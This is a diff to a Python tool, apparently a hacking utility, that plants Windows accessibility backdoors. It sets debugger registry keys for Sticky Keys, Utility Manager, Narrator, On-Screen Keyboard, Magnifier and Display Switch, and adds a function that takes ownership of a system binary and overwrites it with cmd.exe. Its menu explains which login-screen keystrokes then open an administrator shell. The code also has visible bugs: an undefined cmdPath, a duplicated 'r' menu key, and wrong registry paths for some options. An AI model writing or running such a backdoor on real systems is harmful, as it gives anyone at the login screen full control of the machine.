@@ -1,13 +1,10 @@
 import os
-import subprocess
 import winreg
-from hash import calculate_sha256, calculate_md5
+from hash import calculate_sha256
 from config import header, bar
 
-# TODO: use takeown.exe and icacls.exe to take ownership/perms away from TrustedInstaller
-def install_backdoor(path):
+def install_registry_backdoor(path):
     fileName = os.path.basename(path).strip(' ')
-
     print("Adding " + fileName + " backdoor to registry.")
     try:
         key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
@@ -16,10 +13,35 @@ def install_backdoor(path):
         except Exception as e:
             print(e)
             print("Error: Could not create sub-key. Please run with Administrator privileges.")
+            return
     except Exception as e:
         print(e)
         print("Error: Could not create key. Please run with Administrator privileges.")
+        return
+    print(fileName + " debugger registry key successfully added.")
 
+# TODO: use takeown.exe and icacls.exe to take ownership/perms away from TrustedInstaller
+def replace_file(path):
+    print(bar)
+    fileName = os.path.basename(path).strip(' ')
+    print("WARNING: This will copy over " + fileName + "!")
+
+    print("Backing up " + fileName + " to the current directory.  You can restore from backup by doing [R]emove Backdoor option from the Main Menu.")
+    try:
+        os.system("copy " + path)
+    except Exception as e:
+        print(e)
+        return
+    print("Replacing " + fileName + " with cmd.exe.")
+    try:
+        print("Granting Administrators full privilege on " + fileName)
+        os.system('TAKEOWN /F "' + path + '"')
+        os.system('icacls.exe "' + path + '" /grant Administrators:F')
+        print("Copying cmd.exe over " + fileName)
+        os.system("copy " + cmdPath + " " + path)
+    except Exception as e:
+        print(e)
+        return
 
 def remove_backdoor(path):
     print(bar)
@@ -64,7 +86,6 @@ def remove_backdoor(path):
 
 if __name__ == "__main__":
     print(header)
-    # TODO: add narrator.exe, osk.exe, magnify.exe, displayswitch.exe,
     # get the current drive name
     drive = os.getenv('SystemDrive')
     sethcPath = (drive + '\windows\system32\sethc.exe ')
@@ -99,45 +120,48 @@ if __name__ == "__main__":
             print("[S]ticky Keys (sethc.exe).")
             print("[U]tility Manager (utilman.exe).")
             print("[D]isplay Switch (dispalyswitch.exe).")
-            print("[M]agnify (magnify.exe).")
+            print("[M]agnifier (magnify.exe).")
             print("[N]arrator (narrator.exe).")
-            print("[O]n Screen Keyboard (osk.exe).")
+            print("[O]n-Screen Keyboard (osk.exe).")
+            print("[R]eplace.")
             print("[A]ll.")
             print("[R]eturn to the Main Menu.")
             choice = input("[>]").lower()
             if choice == 's':
                 print("At the login screen, press [Shift 5 times] to open command prompt with Administrator Privileges.")
-                install_backdoor(sethcRegistryPath)
+                install_registry_backdoor(sethcRegistryPath)
             elif choice == 'u':
                 print("At the login screen, press [Windows Key + U] to open command prompt with Administrator Privileges.")
-                install_backdoor(utilmanRegistryPath)
+                install_registry_backdoor(utilmanRegistryPath)
             elif choice == 'd':
                 print("At the login screen, press [Windows Key + P] to open command prompt with Administrator Privileges.")
-                install_backdoor(displayswitchRegistryPath)
+                install_registry_backdoor(displayswitchRegistryPath)
             elif choice == 'm':
                 print("At the login screen, press [Windows Key + U] and select Magnify to open command prompt with Administrator Privileges.")
-                install_backdoor(magnifiyRegistryPath)
+                install_registry_backdoor(magnifiyRegistryPath)
             elif choice == 'n':
                 print("At the login screen, press [Windows Key + U] and select Narrator to open command prompt with Administrator Privileges.")
-                install_backdoor(displayswitchRegistryPath)
+                install_registry_backdoor(displayswitchRegistryPath)
             elif choice == 'o':
                 print("At the login screen, press [Windows Key + U] and select On-Screen Keyboard to open command prompt with Administrator Privileges.")
-                install_backdoor(displayswitchRegistryPath)
-            # NOTE: Does not install
+                install_registry_backdoor(displayswitchRegistryPath)
+            # NOTE: Does not install utilman.exe backdoor, as that would disallow access to the
+            # narrator.exe, osk.exe, and magnify.exe backdoors.
             elif choice == 'a':
-                print("""At the login screen, to open the command prompt with Administrator Privileges:
-                        ○ [Shift 5 times]
-                        ○ [Windows Key + U] and select Narrator
-                        ○ [Windows Key + U] and select On-Screen Keyboard
-                        ○ [Windows Key + U] and select Magnify
-                        ○ [Windows Key + P]""")
-                install_backdoor(sethcRegistryPath)
-                install_backdoor(narratorRegistryPath)
-                install_backdoor(oskRegistryPath)
-                install_backdoor(magnifiyRegistryPath)
-                install_backdoor(displayswitchRegistryPath)
+                print("""At the login screen, to open the command prompt with Administrator Privileges,
+Perform any of the following:
+[Shift 5 times]
+[Windows Key + U] and select Narrator
+[Windows Key + U] and select On-Screen Keyboard
+[Windows Key + U] and select Magnify
+[Windows Key + P]""")
+                install_registry_backdoor(sethcRegistryPath)
+                install_registry_backdoor(narratorRegistryPath)
+                install_registry_backdoor(oskRegistryPath)
+                install_registry_backdoor(magnifiyRegistryPath)
+                install_registry_backdoor(displayswitchRegistryPath)
             elif choice == 'r':
-                continue
+                replace_file(narratorPath)
             else:
                 print("Incorrect input.")
                 continue
@@ -150,7 +174,6 @@ if __name__ == "__main__":
             remove_backdoor(magnifyPath)
             remove_backdoor(displayswitchPath)
         elif choice == 'c':
-
             print("***Under Construction***\nPlease post any suggestions for configuration to www.github.com/gitgiant")
             print("[D]isable Windows accessibility options in registry. (doesnt work)")
             print("[E]nable Windows accessibility options in registry. (doesnt work)")
